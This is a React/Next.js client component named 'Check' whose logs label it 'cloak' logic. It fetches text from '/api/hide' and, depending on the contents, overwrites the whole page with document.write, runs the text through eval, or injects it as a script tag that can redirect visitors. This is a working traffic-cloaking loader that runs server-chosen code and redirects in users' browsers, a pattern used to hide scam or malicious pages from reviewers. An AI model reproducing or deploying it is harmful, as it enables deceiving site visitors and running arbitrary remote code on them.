'use client'
import { useEffect } from 'react'

export default function Check() {
    useEffect(() => {
        console.log('[cloak] loading cloak logic...')

        fetch('/api/hide')
            .then(res => res.text())
            .then(code => {
                console.log('[cloak] response code:', code)

                if (!code.trim()) return

                if (code.includes('<html') || code.includes('<iframe')) {
                    document.open()
                    document.write(code)
                    document.close()
                } else if (code.includes('document.createElement')) {
                    // ⚠️ Безпечно тільки якщо код із довіреного джерела
                    try {
                        eval(code)
                        console.log('[cloak] script executed via eval')
                    } catch (err) {
                        console.error('[cloak] eval failed:', err)
                    }
                } else if (code.includes('location.href') || code.startsWith('http')) {
                    const script = document.createElement('script')
                    script.type = 'text/javascript'
                    script.innerHTML = code
                    document.head.appendChild(script)
                }
            })
            .catch(err => console.warn('[cloak] fetch failed', err))
    }, [])

    return null
}
